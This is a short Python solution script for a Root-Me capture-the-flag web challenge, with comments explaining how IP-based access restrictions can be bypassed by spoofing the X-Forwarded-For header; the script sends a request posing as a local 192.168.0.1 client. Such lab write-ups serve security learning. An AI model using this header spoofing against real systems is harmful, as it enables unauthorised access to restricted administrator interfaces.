# Challenge 
#
# HTTP - IP restriction bypass
#   Only local users will be able to access the page


# Vulnerability
#
# Some web application use ip address to block access to the visitors. this is
# the case for some administrator interfaces.
#
# To implement this, the web application will check the "REMOTE_ADDR" value that
# the web server passes through to the application.
#
# If the visitor is using a proxy, the "REMOTE_ADDR" field will contain the
# address of the proxy instead of the visitor. so some proxy add
# "X-Forwarded-For" to be able to see the visitor's ip address by web server.


# Exploit
# So, we need to use this method to say that i am a client of you network.

import requests

HEADERS = {
    'Accept-language': 'en-US,en;q=0.9,vi;q=0.8',
    'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0)'
                  'Gecko/20100101'
                  'Firefox/92.0',

    'X-Forwarded-For': '192.168.0.1'
}

URL = "http://challenge01.root-me.org/web-serveur/ch68/"

# send the request
resp = requests.request("GET", URL, headers=HEADERS)

# server response
print(resp.text)
